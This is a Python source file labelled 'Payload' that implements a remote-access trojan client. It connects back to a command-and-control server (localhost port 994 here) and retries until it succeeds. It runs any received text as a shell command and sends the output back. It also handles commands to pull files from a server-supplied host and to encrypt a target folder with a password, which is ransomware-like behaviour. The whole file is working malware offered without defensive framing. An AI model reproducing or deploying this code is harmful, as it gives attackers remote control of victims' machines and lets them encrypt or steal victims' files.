## Payload

import socket
import re
import subprocess as sp
import os
import threading
import math
import time

import client_imports
import filetransfer_client as ftc 

import encryptor

FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!quit"

class c_sock:
    
    def __init__(self):
        ## defining the threads up here due to the class & passing self
        pass
    
    def connect(self, server_ip, server_port):
        try:
            self.ADDR = (server_ip, server_port)
            
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            
            self.client.connect(self.ADDR)
            #print("DEBUG: connected")
            return True
        except:
            pass

    ## send to server
    def send(self, msg):
        message = msg.encode(FORMAT)        
        self.client.send(message)


    ## command and control
    def C_C(self):
        ## catching message from server
        recieved_message = self.client.recv(10000).decode(FORMAT)

    ## handling message
        if recieved_message == DISCONNECT_MESSAGE:
            output = "Disconnecting"
            exit()
        elif recieved_message == "":
            self.client.send(str("EMPTY - Try again").encode(FORMAT))
        
    ## == Using !_ infront of variables so things do not get mixed up by accident
        elif "!_os-name" in recieved_message:
            self.client.send(str(os.name).encode(FORMAT))
    
    # File download
        elif "!_get" in recieved_message:
            
            print("DOWNLAOD COMMAND GOT TO CLIENT SUCCESFULLY")
            
            lst = []
            
            for i in recieved_message.split():
                lst.append(i)
            
            print(lst)

            IP = lst[1]
            PORT = int(lst[2])
            FILE = lst[3]
            
            ftc.main(IP, PORT, FILE)

    # Encryptor
        elif "!_encrypt" in recieved_message:
            
            print("ENCRYPT COMMAND GOT TO CLIENT SUCCESFULLY")
            
            encryptor_lst = []
            
            for i in recieved_message.split():
                encryptor_lst.append(i)
            
            print(encryptor_lst)

            FOLDER = encryptor_lst[1]
            EXTENSION = encryptor_lst[2]
            PASSWORD = encryptor_lst[3]
            
            encryptor.encrypt(FOLDER, PASSWORD, EXTENSION)
            
        
        else:
            try:
                output = sp.check_output(recieved_message, shell=True)
                #output = sp.getoutput(recieved_message)
                #print(output)
                self.client.send(output)
            except sp.CalledProcessError:
                self.client.send(str("INVALID COMMAND").encode(FORMAT))
        
        ## each new C_C function needs to be in its own thread incase it fails/errors out




if __name__ == "__main__":
    ## connect to server
    while True:
        if c_sock.connect(c_sock, '127.0.0.1', 994):
            break
        else:
            print("trying to connect")
        time.sleep(30)

    # running command n control
    #t1 = Thread(target=sock.C_C, args=(sock))   
     
    while True:
        c_sock.C_C(c_sock)
        #t1.start()
